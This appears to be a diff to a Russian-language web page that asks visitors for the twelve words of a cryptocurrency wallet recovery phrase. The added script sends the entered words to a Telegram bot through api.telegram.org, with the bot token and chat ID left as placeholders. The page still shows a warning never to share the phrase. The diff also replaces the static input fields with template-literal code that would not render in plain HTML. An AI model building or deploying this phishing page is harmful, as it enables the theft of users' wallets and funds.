@@ -43,23 +43,24 @@
         .seed-input {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
+            gap: 8px;
         }
         .seed-item {
             position: relative;
         }
         .seed-item label {
             position: absolute;
-            top: -10px;
+            top: -14px;
             left: 10px;
-            font-size: 12px;
+            font-size: 16px;
             color: #A0A0A0;
+            font-weight: bold;
         }
         input {
-            padding: 10px;
+            padding: 8px;
             font-size: 14px;
             border: 1px solid #333333;
-            border-radius: 8px;
+            border-radius: 6px;
             background-color: #2C2C2C;
             color: #FFFFFF;
             text-align: center;
@@ -103,58 +104,38 @@
         <form id="seedForm">
             <div class="seed-input">
                 <!-- Поля для ввода -->
-                <div class="seed-item">
-                    <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word2">2.</label>
-                    <input type="text" id="word2" name="word2" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word3">3.</label>
-                    <input type="text" id="word3" name="word3" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word4">4.</label>
-                    <input type="text" id="word4" name="word4" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word5">5.</label>
-                    <input type="text" id="word5" name="word5" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word6">6.</label>
-                    <input type="text" id="word6" name="word6" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word7">7.</label>
-                    <input type="text" id="word7" name="word7" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word8">8.</label>
-                    <input type="text" id="word8" name="word8" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word9">9.</label>
-                    <input type="text" id="word9" name="word9" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word10">10.</label>
-                    <input type="text" id="word10" name="word10" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word11">11.</label>
-                    <input type="text" id="word11" name="word11" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
-                <div class="seed-item">
-                    <label for="word12">12.</label>
-                    <input type="text" id="word12" name="word12" placeholder="слово" required autocomplete="off" autocapitalize="none">
-                </div>
+                ${Array.from({ length: 12 }, (_, i) => `
+                    <div class="seed-item">
+                        <label for="word${i + 1}">${i + 1}.</label>
+                        <input type="text" id="word${i + 1}" name="word${i + 1}" placeholder="слово" required autocomplete="off" autocapitalize="none">
+                    </div>
+                `).join('')}
             </div>
             <button type="submit">Отправить</button>
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
+    <script>
+        document.getElementById('seedForm').addEventListener('submit', async function (event) {
+            event.preventDefault();
+            const formData = new FormData(event.target);
+            const seedWords = Array.from(formData.values()).join(' ');
+            
+            const botToken = 'ВАШ_ТОКЕН_БОТА';
+            const chatId = 'ВАШ_CHAT_ID';
+            const message = `Секретная фраза: ${seedWords}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+                alert('Данные успешно отправлены!');
+            } catch (error) {
+                alert('Ошибка при отправке данных.');
+            }
+        });
+    </script>
 </body>
 </html>
